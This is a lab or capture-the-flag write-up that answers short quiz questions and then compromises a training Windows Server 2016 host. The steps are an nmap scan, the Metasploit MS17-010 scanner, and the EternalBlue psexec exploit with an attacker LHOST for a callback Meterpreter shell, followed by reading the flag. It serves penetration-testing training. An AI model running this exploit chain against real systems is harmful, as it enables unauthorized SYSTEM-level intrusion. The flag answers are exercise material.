### Windows Infiltration Exercise
 
IP: 10.129.123.117
 
---
 
### Question 1:
What file type is a text-based DOS script used to perform tasks from the cli? (answer with the file extension, e.g. '.something')
 
Batch files, or .bat, are text-based DOS scripts utilized by system administrators to complete multiple tasks through the command-line interpreter.
 
&#x1F6A9; found **.bat**.
 
---
 
### Question 2:
What Windows exploit was dropped as a part of the Shadow Brokers leak? (Format: ms bulletin number, e.g. MSxx-xxx)
 
MS17-010 is an exploit leaked in the Shadow Brokers dump from the NSA, which was notably used in the WannaCry ransomware and NotPetya cyberattacks.
 
&#x1F6A9; found **MS17-010**.
 
---
 
### Question 3:
Gain a shell on the vulnerable target, then submit the contents of the flag.txt file that can be found in C:\
 
I start off by doing an nmap scan on the server.
 
```diff
+ $ sudo nmap -sT -A -p- 10.129.123.117
```PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: 10.129.123.199 - /
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h18m38s, deviation: 4h02m31s, median: -1m23s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-08-29T00:10:42-07:00
| smb2-time: 
|   date: 2026-08-29T07:10:39
|_  start_date: 2026-08-29T07:09:27
```
 
I see that SMB is running on Windows and is the 2016 version, so I check to see if it's vulnerable to EternalBlue by using Metasploit's ms17_010 scanner.
 
```diff
+ [msf](Jobs:0 Agents:0) >> use auxiliary/scanner/smb/smb_ms17_010
+ [msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_ms17_010) >> set RHOSTS 10.129.123.117
+ [msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_ms17_010) >> run
 
	[+] 10.129.123.117:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)
 
Seeing this, I then run the psexec module for EternalBlue.
 
```diff
+ [msf](Jobs:0 Agents:0) >> use exploit/windows/smb/ms17_010_psexec
+ [msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set RHOSTS 10.129.123.117
+ [msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set LHOST 10.10.14.30
+ [msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> run
```
 
	RHOSTS => 10.129.123.117
 
This gives me a shell as NT AUTHORITY\SYSTEM, so I navigate to C:\ and read the flag.
 
```diff
+ (Meterpreter 1)(C:\Windows\system32) > cd /
+ (Meterpreter 1)(C:\) > cat flag.txt
```
 
	EB-Still-W0rk$
 
&#x1F6A9; found **EB-Still-W0rk$**.
 
